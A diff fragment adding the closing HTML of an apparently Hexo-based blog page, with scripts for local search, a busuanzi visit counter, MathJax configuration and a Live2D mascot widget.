+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":212,"height":472},"mobile":{"show":true},"log":false});</script></body>
+</html>
